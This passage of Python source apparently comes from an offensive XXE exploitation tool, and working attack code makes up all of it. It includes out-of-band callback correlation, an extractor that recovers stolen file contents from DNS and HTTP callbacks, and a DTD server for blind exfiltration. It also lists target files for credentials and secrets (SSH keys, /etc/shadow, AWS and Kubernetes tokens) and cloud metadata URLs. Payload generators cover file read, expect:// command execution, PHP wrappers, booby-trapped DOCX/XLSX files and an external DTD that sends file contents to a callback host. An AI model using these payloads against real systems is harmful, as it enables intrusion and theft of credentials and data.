                self.payloads_sent += 1
                self.subdomains.append(subdomain)
        return subdomain, token

    # ----- callback correlation (auto mode only) -----
    @staticmethod
    def _callback_id(cb: Dict[str, Any]) -> str:
        for key in ("full-id", "unique-id", "id"):
            v = cb.get(key)
            if v:
                return str(v)
        return json.dumps(cb, sort_keys=True)

    @staticmethod
    def _callback_subdomain(cb: Dict[str, Any]) -> str:
        for key in ("full-id", "subdomain", "host", "unique-id"):
            v = cb.get(key)
            if isinstance(v, str) and v:
                return v.lower()
        return ""

    def _scan_callbacks(self,
                        only_token: Optional[str] = None
                        ) -> List[Dict[str, Any]]:
        if self._manager is None:
            return []
        matches: List[Dict[str, Any]] = []
        callbacks = self._manager.callbacks()
        with self._lock:
            tokens = ([only_token] if only_token
                      else list(self._pending_tokens.keys()))
            for cb in callbacks:
                cb_id = self._callback_id(cb)
                if cb_id in self._consumed_callbacks:
                    continue
                sub = self._callback_subdomain(cb)
                if not sub:
                    continue
                for token in tokens:
                    if token and token in sub:
                        matches.append(cb)
                        self._consumed_callbacks.add(cb_id)
                        break
        return matches

    def start_poll(self, token: str, timeout: float = 30.0) -> Future:
        fut: Future = Future()

        if self._manager is None:
            fut.set_result([])
            return fut

        def _poll():
            started = time.time()
            deadline = started + max(0.0, timeout)
            while time.time() < deadline:
                hits = self._scan_callbacks(only_token=token)
                if hits:
                    return hits
                elapsed = time.time() - started
                time.sleep(0.08 if elapsed < 2.0 else 0.4)
            return []

        threading.Thread(
            target=lambda: fut.set_result(_poll()),
            name="oob-poll",
            daemon=True,
        ).start()
        return fut

    def validate_hit_specific(self, hit: Dict, token: str) -> bool:
        if not isinstance(hit, dict) or not token:
            return False
        if self._manager is None:
            return False
        sub = self._callback_subdomain(hit)
        return bool(sub) and token in sub

    @staticmethod
    def token_from_subdomain(subdomain: str) -> str:
        if not subdomain:
            return ""
        host = subdomain.split(".", 1)[0]
        return host.rsplit("-", 1)[-1] if "-" in host else ""


# ---------------------------------------------------------------------------
# OOB exfiltration extractor
#
# When a payload carries exfiltrated data in the callback (typically as a
# `?data=<file-content>` query parameter or as a DNS subdomain label),
# this extracts the raw string. The caller then routes it through
# FileContentExtractor and LootStore.
#
# Callbacks arrive as dicts from interactsh-client's JSON event stream.
# The relevant fields are:
#   protocol      : "dns" | "http" | "smtp" | ...
#   full-id       : the full subdomain or hostname that was contacted
#   raw-request   : base64-encoded raw request bytes (HTTP) or DNS packet
#
# For DNS callbacks, the exfiltrated data lives in the subdomain labels.
# For HTTP callbacks, it lives in the request path or query string.
# ---------------------------------------------------------------------------

class OOBExfilExtractor:
    DATA_PARAMS = ("data", "d", "x", "payload")

    @classmethod
    def extract(cls, callback: Dict[str, Any],
                session_domain: str = "") -> Optional[str]:
        if not isinstance(callback, dict):
            return None
        protocol = (callback.get("protocol") or "").lower()
        if protocol == "http":
            return cls._extract_http(callback)
        if protocol == "dns":
            return cls._extract_dns(callback, session_domain)
        return None

    @classmethod
    def _extract_http(cls, callback: Dict[str, Any]) -> Optional[str]:
        raw_b64 = callback.get("raw-request")
        if not raw_b64:
            return None
        try:
            request_bytes = base64.b64decode(raw_b64)
        except (binascii.Error, ValueError):
            return None

        try:
            request_text = request_bytes.decode("utf-8", errors="replace")
        except Exception:
            return None

        first_line = request_text.split("\r\n", 1)[0].split("\n", 1)[0]
        parts = first_line.split()
        if len(parts) < 2:
            return None

        path_and_query = parts[1]

        if "?" in path_and_query:
            _path, query = path_and_query.split("?", 1)
        else:
            query = ""

        for kv in query.split("&"):
            if "=" not in kv:
                continue
            k, v = kv.split("=", 1)
            if k.lower() in cls.DATA_PARAMS:
                decoded = cls._decode_payload(v)
                if decoded:
                    return decoded

        fallback = query or path_and_query.lstrip("/")
        if fallback:
            return cls._decode_payload(fallback)
        return None

    @classmethod
    def _extract_dns(cls, callback: Dict[str, Any],
                     session_domain: str) -> Optional[str]:
        full_id = (callback.get("full-id") or "").lower()
        if not full_id:
            return None

        if session_domain and full_id.endswith(session_domain.lower()):
            prefix = full_id[: -len(session_domain)].rstrip(".")
        else:
            prefix = full_id.split(".", 1)[0]

        if not prefix:
            return None
        return cls._decode_payload(prefix)

    @staticmethod
    def _decode_payload(raw: str) -> Optional[str]:
        if not raw:
            return None

        try:
            decoded = unquote(raw)
        except Exception:
            decoded = raw

        if decoded.startswith("<![CDATA[") and decoded.endswith("]]>"):
            decoded = decoded[9:-3]

        if (len(decoded) >= 40
                and re.fullmatch(r"[A-Za-z0-9+/=]+", decoded)
                and "=" in decoded[-2:]):
            try:
                candidate = base64.b64decode(decoded).decode(
                    "utf-8", errors="strict")
                if candidate and "\x00" not in candidate:
                    decoded = candidate
            except (binascii.Error, ValueError, UnicodeDecodeError):
                pass

        decoded = decoded.strip()
        return decoded or None



# ---------------------------------------------------------------------------
# DTD serving for blind exfiltration
# ---------------------------------------------------------------------------

class DTDServer:

    def __init__(self, host: str, port: int, public_url: str):
        self.host = host
        self.port = int(port)
        self.public_url = public_url.rstrip("/")
        self._dtds: Dict[str, str] = {}
        self._lock = threading.Lock()
        self._server = None
        self._thread: Optional[threading.Thread] = None

    def start(self) -> None:
        from http.server import HTTPServer, BaseHTTPRequestHandler

        registry = self

        class Handler(BaseHTTPRequestHandler):
            def do_GET(self):
                token = (self.path.lstrip("/")
                         .split("?", 1)[0]
                         .split(".dtd", 1)[0])
                with registry._lock:
                    content = registry._dtds.get(token)
                if content is None:
                    self.send_response(404)
                    self.send_header("Content-Length", "0")
                    self.end_headers()
                    return
                body = content.encode("utf-8")
                self.send_response(200)
                self.send_header("Content-Type", "application/xml; "
                                                "charset=utf-8")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

            def log_message(self, fmt, *args):
                return

        self._server = HTTPServer((self.host, self.port), Handler)
        self._thread = threading.Thread(
            target=self._server.serve_forever,
            name="dtd-server",
            daemon=True,
        )
        self._thread.start()

    def register(self, token: str, dtd_content: str) -> str:
        with self._lock:
            self._dtds[token] = dtd_content
        return f"{self.public_url}/{token}.dtd"

    def stop(self) -> None:
        if self._server is not None:
            try:
                self._server.shutdown()
                self._server.server_close()
            except Exception:
                pass
            self._server = None

    @property
    def enabled(self) -> bool:
        return self._server is not None


class FileDTDWriter:

    def __init__(self, directory: str, url_prefix: str):
        self.dir = Path(directory)
        self.url_prefix = url_prefix.rstrip("/")
        self.dir.mkdir(parents=True, exist_ok=True)

    def register(self, token: str, dtd_content: str) -> str:
        path = self.dir / f"{token}.dtd"
        path.write_text(dtd_content, encoding="utf-8")
        return f"{self.url_prefix}/{token}.dtd"

    def stop(self) -> None:
        return

    @property
    def enabled(self) -> bool:
        return True

# ---------------------------------------------------------------------------
# XXE Payload Generator
# ---------------------------------------------------------------------------

class XXEPayloadGenerator:

    PRIORITY_FILES = (
        # Linux — strongest, most valuable
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hostname",
        "/etc/issue",
        "/proc/version",
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/mounts",
        "/proc/net/arp",
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_ed25519",
        "/root/.aws/credentials",
        "/root/.bash_history",
        "/.env",
        # Windows — strongest, most valuable
        "c:/windows/win.ini",
        "c:/windows/system.ini",
        "c:/windows/system32/drivers/etc/hosts",
        "c:/windows/system32/config/sam",
        "c:/boot.ini",
        "c:/inetpub/wwwroot/web.config",
        "c:/windows/panther/unattend.xml",
    )

    LINUX_FILES = [
        # classic
        "/etc/passwd",
        "/etc/shadow",
        "/etc/hosts",
        "/etc/hostname",
        "/etc/issue",
        "/etc/mtab",
        "/etc/fstab",
        "/etc/crontab",
        "/etc/resolv.conf",
        "/etc/host.conf",
        # environment / process
        "/proc/self/environ",
        "/proc/self/cmdline",
        "/proc/self/mounts",
        "/proc/self/cgroup",
        "/proc/self/status",
        "/proc/1/environ",
        "/proc/1/cmdline",
        "/proc/version",
        "/proc/net/arp",
        "/proc/net/fib_trie",
        "/proc/net/tcp",
        # app source / config
        "/var/www/html/index.php",
        "/var/www/html/config.php",
        "/var/www/html/.env",
        "/.env",
        "/root/.env",
        # SSH keys
        "/root/.ssh/id_rsa",
        "/root/.ssh/id_ed25519",
        "/root/.ssh/authorized_keys",
        "/root/.ssh/config",
        "/root/.bash_history",
        "/root/.aws/credentials",
        "/root/.aws/config",
        "/root/.config/gcloud/credentials.db",
        # container
        "/.dockerenv",
        "/run/secrets/db_password",
        "/run/secrets/api_key",
        # Kubernetes
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/var/run/secrets/kubernetes.io/serviceaccount/namespace",
        "/var/run/secrets/kubernetes.io/serviceaccount/ca.crt",
    ]
    WINDOWS_FILES = [
        "c:/windows/win.ini",
        "c:/windows/system.ini",
        "c:/windows/system32/drivers/etc/hosts",
        "c:/windows/system32/drivers/etc/lmhosts.sam",
        "c:/windows/system32/config/sam",
        "c:/windows/system32/config/software",
        "c:/windows/system32/license.rtf",
        "c:/windows/repair/sam",
        "c:/windows/panther/unattend.xml",
        "c:/windows/panther/unattend/unattend.xml",
        "c:/unattend.xml",
        "c:/autounattend.xml",
        "c:/boot.ini",
        "c:/inetpub/wwwroot/web.config",
        "c:/inetpub/logs/logfiles/",
        "c:/users/administrator/.ssh/id_rsa",
        "c:/users/administrator/.aws/credentials",
        "c:/users/administrator/.bash_history",
    ]
    METADATA_URLS = [
        # AWS IMDS (v1 — v2 requires a token header and is out of scope)
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data/",
        # GCP
        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/",
        "http://metadata.google.internal/computeMetadata/v1/project/attributes/",
        # Azure
        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
        # Alibaba Cloud
        "http://100.100.100.200/latest/meta-data/",
        "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
        # DigitalOcean
        "http://169.254.169.254/metadata/v1/",
        # Oracle Cloud
        "http://169.254.169.254/opc/v1/instance/",
        # Kubernetes service-account API (in-cluster)
        "https://kubernetes.default.svc/api/v1/namespaces/default/secrets/",
        "https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets/",
        # localhost probes
        "http://127.0.0.1:80/",
        "http://127.0.0.1:8080/",
        "http://127.0.0.1:8000/",
        "http://127.0.0.1:5000/",
        "http://127.0.0.1:3000/",
        "http://localhost:8080/",
        "http://localhost:9200/",
        "http://[::1]:80/",
    ]

    LOCAL_DTDS = [
        
        # ------------------------------------------------------------------
        # Linux — DocBook / XHTML (Debian, Ubuntu, Fedora, RHEL, Arch)
        # ------------------------------------------------------------------
        ("/usr/share/yelp/dtd/docbookx.dtd",
         ["ISOamso", "ISOamsa", "ISOamsb", "ISOamsr", "ISOamsn"]),
        ("/usr/share/xml/fontconfig/fonts.dtd",
         ["ISOamso"]),
        ("/usr/share/xml/scrollkeeper/dtds/scrollkeeper-omf.dtd",
         ["ISOamso"]),

        # DocBook schema DTDs (multiple versions)
        ("/usr/share/xml/docbook/schema/dtd/5.0/docbook.dtd",
         ["ISOamso"]),
        ("/usr/share/xml/docbook/schema/dtd/4.5/docbookx.dtd",
         ["ISOamso", "ISOamsa"]),
        ("/usr/share/xml/docbook/schema/dtd/4.4/docbookx.dtd",
         ["ISOamso", "ISOamsa"]),
        ("/usr/share/xml/docbook/schema/dtd/4.3/docbookx.dtd",
         ["ISOamso"]),
        ("/usr/share/xml/docbook/schema/dtd/4.2/docbookx.dtd",
         ["ISOamso"]),
        ("/usr/share/xml/docbook/schema/dtd/4.1.2/docbookx.dtd",
         ["ISOamso"]),
        ("/usr/share/xml/docbook/schema/dtd/4.0/docbookx.dtd",
         ["ISOamso"]),

        # DocBook SGML-tree DTDs (older distros)
        ("/usr/share/sgml/docbook/xml-dtd-4.5/docbookx.dtd",
         ["ISOamso"]),
        ("/usr/share/sgml/docbook/xml-dtd-4.4/docbookx.dtd",
         ["ISOamso"]),
        ("/usr/share/sgml/docbook/xml-dtd-4.3/docbookx.dtd",
         ["ISOamso"]),
        ("/usr/share/sgml/docbook/xml-dtd-4.2/docbookx.dtd",
         ["ISOamso"]),
        ("/usr/share/sgml/docbook/xml-dtd-4.1.2/docbookx.dtd",
         ["ISOamso"]),
        ("/usr/share/sgml/docbook/dtd/xml-4.1.2/docbookx.dtd",
         ["ISOamso"]),
        ("/usr/share/sgml/docbook/dtd/xml-4.0/docbookx.dtd",
         ["ISOamso"]),

        # XHTML DTDs
        ("/usr/share/xml/xhtml/schema/dtd/xhtml1-strict.dtd",
         ["ISOamso"]),
        ("/usr/share/xml/xhtml/schema/dtd/xhtml1-transitional.dtd",
         ["ISOamso"]),
        ("/usr/share/xml/xhtml/schema/dtd/xhtml1-frameset.dtd",
         ["ISOamso"]),
        ("/usr/share/sgml/xhtml1/xhtml1-strict.dtd",
         ["ISOamso"]),
        ("/usr/share/sgml/xhtml1/xhtml1-transitional.dtd",
         ["ISOamso"]),

        # ISO entity sets (individual .ent files — small, widely present)
        ("/usr/share/xml/entities/xml-iso-entities-8879.1986/ISOamsa.ent",
         ["ISOamso"]),
        ("/usr/share/xml/entities/xml-iso-entities-8879.1986/ISOamsb.ent",
         ["ISOamso"]),
        ("/usr/share/xml/entities/xml-iso-entities-8879.1986/ISOamsc.ent",
         ["ISOamso"]),
        ("/usr/share/xml/entities/xml-iso-entities-8879.1986/ISOamsn.ent",
         ["ISOamso"]),
        ("/usr/share/xml/entities/xml-iso-entities-8879.1986/ISOamsr.ent",
         ["ISOamso"]),
        ("/usr/share/sgml/entities/xml-iso-entities-8879.1986/ISOamsa.ent",
         ["ISOamso"]),

        # GNOME / GTK docs
        ("/usr/share/xml/gnome/xml/dtds/gnome-doc-utils.dtd",
         ["ISOamso"]),
        ("/usr/share/xml/gnome/xml/dtds/gnome-utils.dtd",
         ["ISOamso"]),
        ("/usr/share/xml/gtk-doc/gtk-doc.dtd",
         ["ISOamso"]),

        # KDE / Qt docs
        ("/usr/share/kde4/apps/ksgmltools2/customization/kde-dtd/kde-chunk.xsl",
         ["ISOamso"]),
        ("/usr/share/xml/kde/*.dtd",
         ["ISOamso"]),

        # GStreamer / misc
        ("/usr/share/xml/gstreamer/gst-1.0.dtd",
         ["ISOamso"]),
        ("/usr/share/xml/gnome/xml/dtds/*.dtd",
         ["ISOamso"]),

        # Ghostscript / GIMP
        ("/usr/share/ghostscript/Resource/Init/gs_init.ps",
         ["ISOamso"]),   # not a DTD but a common misconfig test

        # Debian alternatives
        ("/etc/alternatives/xml-docbook-dtd",
         ["ISOamso"]),
        ("/etc/xml/docbook",
         ["ISOamso"]),

        # Docker / containers
        ("/etc/docker/daemon.json.dtd",
         ["ISOamso"]),

        # Apache-related DTDs (occasionally present)
        ("/etc/apache2/dtd/*.dtd",
         ["ISOamso"]),
        ("/usr/share/apache2/dtd/*.dtd",
         ["ISOamso"]),

        # ------------------------------------------------------------------
        # Java application servers
        # ------------------------------------------------------------------
        # IBM WebSphere
        ("/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd",
         ["condition", "pattern"]),
        ("/opt/IBM/WebSphere/AppServer/properties/sip-app_1_0.dtd",
         ["ISOamso"]),
        ("/opt/IBM/WebSphere/AppServer/properties/*.dtd",
         ["condition"]),

        # Apache Tomcat — DTDs packaged inside jars, commonly unpacked
        ("/opt/tomcat/lib/*.jar!/META-INF/*.dtd",
         ["ISOamso"]),
        ("/usr/share/tomcat9/lib/*.jar!/META-INF/*.dtd",
         ["ISOamso"]),

        # JBoss / WildFly
        ("/opt/jboss/standalone/deployments/*.dtd",
         ["ISOamso"]),
        ("/opt/wildfly/standalone/deployments/*.dtd",
         ["ISOamso"]),

        # ------------------------------------------------------------------
        # Windows
        # ------------------------------------------------------------------
        # WMI DTDs — always present on Windows
        ("C:\\Windows\\System32\\wbem\\xml\\cim20.dtd",
         ["SuperClass"]),
        ("C:\\Windows\\System32\\wbem\\xml\\cim20.dtd",
         ["ISOamso"]),
        ("C:\\Windows\\System32\\wbem\\cimwin32.dtd",
         ["SuperClass"]),
        ("C:\\Windows\\System32\\wbem\\xml\\cimv2.dtd",
         ["SuperClass"]),

        # Office DTDs — always present on Windows
        ("C:\\Program Files\\Common Files\\microsoft shared\\OFFICE16\\mso.dll",
         ["ISOamso"]),
        ("C:\\Program Files\\Common Files\\microsoft shared\\OFFICE15\\mso.dll",
         ["ISOamso"]),
        ("C:\\Program Files\\Common Files\\microsoft shared\\OFFICE14\\mso.dll",
         ["ISOamso"]),

        # MSXML / WinHTTP DTDs
        ("C:\\Windows\\System32\\msxml3.dll",
         ["ISOamso"]),
        ("C:\\Windows\\System32\\msxml6.dll",
         ["ISOamso"]),

        # .NET Framework
        ("C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Config\\machine.config",
         ["ISOamso"]),

        # ------------------------------------------------------------------
        # macOS (some DTDs on default installs)
        # ------------------------------------------------------------------
        ("/System/Library/DTDs/PropertyList.dtd",
         ["ISOamso"]),
        ("/System/Library/DTDs/AppleScript.dtd",
         ["ISOamso"]),
        ("/System/Library/DTDs/sdef.dtd",
         ["ISOamso"]),
        ("/usr/share/sgml/docbook/xml-dtd-4.5/docbookx.dtd",
         ["ISOamso"]),   # Homebrew / MacPorts path

        # ------------------------------------------------------------------
        # BSD / Solaris
        # ------------------------------------------------------------------
        ("/usr/local/share/xml/docbook/4.5/docbookx.dtd",
         ["ISOamso"]),
        ("/usr/share/lib/xml/dtd/.*\\.dtd",
         ["ISOamso"]),
        ("/usr/share/lib/xml/dtd/isoamsa.ent",
         ["ISOamso"]),

        # ------------------------------------------------------------------
        # Alpine / musl-based containers (minimal but common)
        # ------------------------------------------------------------------
        ("/usr/share/xml/docbook/4.5/docbookx.dtd",
         ["ISOamso"]),
        ("/etc/xml/catalog",
         ["ISOamso"]),
    ]

    @staticmethod
    def xinclude_xml(href_url: str) -> str:
        return f'''<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="{href_url}" parse="xml"/>
</root>'''

    @staticmethod
    def xml_stylesheet_pi(href_url: str) -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<?xml-stylesheet type="text/xsl" href="{href_url}"?>
<root>test</root>'''

    @staticmethod
    def xslt_document(callback_url: str) -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <out>
      <xsl:copy-of select="document('{callback_url}')"/>
    </out>
  </xsl:template>
</xsl:stylesheet>'''

    @staticmethod
    def xslt_include(callback_url: str) -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:include href="{callback_url}"/>
  <xsl:template match="/">
    <out>done</out>
  </xsl:template>
</xsl:stylesheet>'''

    @staticmethod
    def xsd_schema_location(callback_url: str) -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
      xsi:noNamespaceSchemaLocation="{callback_url}">
  <test>1</test>
</root>'''

    @staticmethod
    def xsd_import(callback_url: str) -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<xs:schema xmlns:xs="http://www.w3.org/2001/XMLSchema">
  <xs:import namespace="http://example.com/imported"
             schemaLocation="{callback_url}"/>
  <xs:element name="root" type="xs:string"/>
</xs:schema>'''

    @staticmethod
    def form_xml(callback_domain: str) -> str:
        inner = (f'<?xml version="1.0"?>'
                 f'<!DOCTYPE root ['
                 f'<!ENTITY % x SYSTEM "http://{callback_domain}/form">'
                 f'%x;]><root>x</root>')
        return "xml=" + quote(inner, safe="")

    @staticmethod
    def multipart_xml(callback_domain: str,
                      boundary: str = "----xxeripperboundary") -> Tuple[bytes, str]:
        inner = f'''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % x SYSTEM "http://{callback_domain}/multipart">
  %x;
]>
<root>x</root>'''
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="xml"\r\n'
            f"Content-Type: application/xml\r\n\r\n"
            f"{inner}\r\n"
            f"--{boundary}--\r\n"
        ).encode("utf-8")
        ct = f"multipart/form-data; boundary={boundary}"
        return body, ct

    @staticmethod
    def docx_xxe(callback_domain: str) -> bytes:
        import io as _io
        import zipfile as _zipfile

        document_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY % x SYSTEM "http://{callback_domain}/docx">
  %x;
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>x</w:t></w:r></w:p></w:body>
</w:document>'''

        content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml"
    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''

        rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="word/document.xml"/>
</Relationships>'''

        buf = _io.BytesIO()
        with _zipfile.ZipFile(buf, "w", _zipfile.ZIP_DEFLATED) as z:
            z.writestr("[Content_Types].xml", content_types)
            z.writestr("_rels/.rels", rels)
            z.writestr("word/document.xml", document_xml)
        return buf.getvalue()

    @staticmethod
    def docx_xslt_pi(callback_url: str) -> bytes:
        import io as _io
        import zipfile as _zipfile

        document_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<?xml-stylesheet type="text/xsl" href="{callback_url}"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>trigger</w:t></w:r></w:p></w:body>
</w:document>'''

        content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml"
    ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>'''

        rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="word/document.xml"/>
</Relationships>'''

        buf = _io.BytesIO()
        with _zipfile.ZipFile(buf, "w", _zipfile.ZIP_DEFLATED) as z:
            z.writestr("[Content_Types].xml", content_types)
            z.writestr("_rels/.rels", rels)
            z.writestr("word/document.xml", document_xml)
        return buf.getvalue()

    @staticmethod
    def xlsx_xslt_pi(callback_url: str) -> bytes:
        import io as _io
        import zipfile as _zipfile

        workbook_xml = f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<?xml-stylesheet type="text/xsl" href="{callback_url}"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
  <sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"
    xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
  </sheets>
</workbook>'''

        content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml"
    ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
</Types>'''

        rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1"
    Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument"
    Target="xl/workbook.xml"/>
</Relationships>'''

        buf = _io.BytesIO()
        with _zipfile.ZipFile(buf, "w", _zipfile.ZIP_DEFLATED) as z:
            z.writestr("[Content_Types].xml", content_types)
            z.writestr("_rels/.rels", rels)
            z.writestr("xl/workbook.xml", workbook_xml)
        return buf.getvalue()

    @staticmethod
    def classic_file_read(file_path: str) -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>&xxe;</root>'''

    @staticmethod
    def php_filter_read(file_path: str) -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={file_path}">
]>
<root>&xxe;</root>'''

    @staticmethod
    def php_expect_rce(command: str = "id") -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "expect://{command}">
]>
<root>&xxe;</root>'''

    @staticmethod
    def java_jar_read(jar_path: str = "/opt/app/lib/app.jar",
                      entry: str = "META-INF/MANIFEST.MF") -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "jar:file://{jar_path}!/{entry}">
]>
<root>&xxe;</root>'''

    @staticmethod
    def php_data_wrapper(payload: str = "<?php phpinfo(); ?>") -> str:
        import base64 as _b64
        enc = _b64.b64encode(payload.encode("utf-8")).decode("ascii")
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "data://text/plain;base64,{enc}">
]>
<root>&xxe;</root>'''

    @staticmethod
    def php_phar_wrapper(phar_path: str = "/tmp/upl.phar",
                         stub: str = "test") -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "phar://{phar_path}/{stub}">
]>
<root>&xxe;</root>'''

    @staticmethod
    def php_glob_enum(pattern: str = "/etc/*") -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "glob://{pattern}">
]>
<root>&xxe;</root>'''

    @staticmethod
    def php_compress_zlib(path: str = "/etc/passwd") -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "compress.zlib://{path}">
]>
<root>&xxe;</root>'''

    @staticmethod
    def ucs4_classic(file_path: str = "/etc/passwd") -> bytes:
        xml = f'''<?xml version="1.0" encoding="UTF-32"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>&xxe;</root>'''
        return xml.encode("utf-32-be")

    @staticmethod
    def alternate_doctype_classic(file_path: str = "/etc/passwd") -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!-- decoy --><!ENTITY xxe SYSTEM "file://{file_path}">
]>
<root>&xxe;</root>'''

    @staticmethod
    def json_probe_xml() -> str:
        return '''<?xml version="1.0" encoding="UTF-8"?>
<root>
  <test>1</test>
</root>'''

    @staticmethod
    def saml_assertion_with_broken_signature() -> str:
        return '''<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol"
                xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">
  <saml:Assertion IssueInstant="2024-01-01T00:00:00Z" Version="2.0">
    <saml:Issuer>probe</saml:Issuer>
    <ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
      <ds:SignatureValue>INVALID</ds:SignatureValue>
    </ds:Signature>
    <saml:Subject>probe</saml:Subject>
  </saml:Assertion>
</samlp:Response>'''

    @staticmethod
    def ssrf_entity(url: str) -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "{url}">
]>
<root>&xxe;</root>'''

    @staticmethod
    def oob_dns_only(callback_domain: str) -> str:
        return f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://{callback_domain}/xxe-dns">
  %remote;
]>
<root>test</root>'''

    @staticmethod
    def oob_external_dtd(dtd_url: str,
                         callback_domain: str,
                         file_path: str = "/etc/passwd") -> Tuple[str, str]:
        xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file://{file_path}">
  <!ENTITY % dtd SYSTEM "{dtd_url}">
  %dtd;
]>
<root>&send;</root>'''
        dtd = (f'<!ENTITY % all "<!ENTITY &#x25; send SYSTEM '
               f'\'http://{callback_domain}/?data=%file;\'>">\n%all;')
        return xml, dtd

    @staticmethod
    def error_based_local_dtd(dtd_path: str,
                            file_path: str = "/etc/passwd",
                            entity_name: str = "ISOamso") -> str:
        return f'''<?xml version="1.0"?>
<!DOCTYPE root SYSTEM "file://{dtd_path}" [
  <!ENTITY % {entity_name} '
     <!ENTITY &#x25; file SYSTEM "file://{file_path}">
     <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
     &#x25;eval;
     &#x25;error;
  '>
]>
<root>test</root>'''

    @staticmethod
    def error_based_malformed(file_path: str = "/etc/passwd") -> str:
        return f'''<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % file SYSTEM "file://{file_path}">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
